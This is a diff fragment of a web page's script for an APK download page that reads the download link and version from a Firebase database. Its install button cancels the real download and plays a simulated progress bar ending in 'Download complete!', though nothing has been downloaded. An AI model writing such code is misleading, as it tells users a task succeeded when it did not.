+                if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+                return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+            }
+
+            function setAPK(data) {
+                noApk.style.display = 'none';
+                let downloadUrl = GITHUB_URL;
+                let version = '1.0.0';
+                let fileSize = 0;
+
+                if (data && data.downloadUrl) {
+                    downloadUrl = data.downloadUrl;
+                    version = data.version || '1.0.0';
+                    fileSize = data.fileSize || 0;
                 }
+
+                fileInfo.classList.add('show');
+                versionDisplay.textContent = version;
+                sizeDisplay.textContent = fileSize ? formatFileSize(fileSize) : '-';
+                btnText.textContent = 'Install';
+                downloadBtn.href = downloadUrl;
+
+                downloadBtn.onclick = function(e) {
+                    e.preventDefault();
+                    downloadProgress.classList.add('show');
+                    downloadFill.style.width = '0%';
+                    progressText.textContent = 'Starting download...';
+
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += Math.random() * 15;
+                        if (progress > 95) {
+                            progress = 95;
+                            clearInterval(interval);
+                            progressText.textContent = 'Almost done...';
+                        }
+                        downloadFill.style.width = progress + '%';
+                    }, 300);
+
+                    setTimeout(() => {
+                        if (downloadProgress.classList.contains('show')) {
+                            downloadFill.style.width = '100%';
+                            progressText.textContent = '✅ Download complete!';
+                            setTimeout(() => {
+                                downloadProgress.classList.remove('show');
+                            }, 3000);
+                        }
+                    }, 8000);
+                };
+            }
+
+            const dbRef = database.ref(DB_PATH);
+            dbRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                setAPK(data);
+            }, (err) => {
+                console.warn('Firebase error, using fallback:', err);
+                setAPK(null);
             });
-        }, 3000);
+
+            setTimeout(() => {
+                dbRef.once('value', (snapshot) => {
+                    if (!snapshot.val()) {
+                        setAPK(null);
+                    }
+                });
+            }, 3000);
+        })();
     </script>
 </body>
 </html>
